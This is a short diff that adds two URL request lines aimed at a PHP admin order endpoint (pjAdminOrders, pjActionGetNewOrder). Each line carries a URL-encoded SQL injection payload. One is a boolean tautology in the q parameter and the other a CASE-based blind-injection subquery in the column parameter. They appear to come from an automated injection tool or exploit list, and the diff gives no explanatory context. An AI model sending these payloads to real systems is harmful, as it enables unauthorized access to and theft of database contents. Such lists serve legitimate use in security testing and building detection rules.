@@ -1,0 +1,2 @@
+/index.php?controller=pjAdminOrders%26action%3dpjActionGetNewOrder%26column%3dcreated%26direction%3dASC%26page%3d1%26rowCount%3d50%26q%3d-1910%27)+OR+6100%3d6100%23%26type%3d
+/index.php?controller=pjAdminOrders%26action%3dpjActionGetNewOrder%26column%3d(SELECT+(CASE+WHEN+(4213%3d4213)+THEN+0x63726561746564+ELSE+(SELECT+7877+UNION+SELECT+7153)+END))%26direction%3dASC%26page%3d1%26rowCount%3d50%26q%3d’’%26type%3d
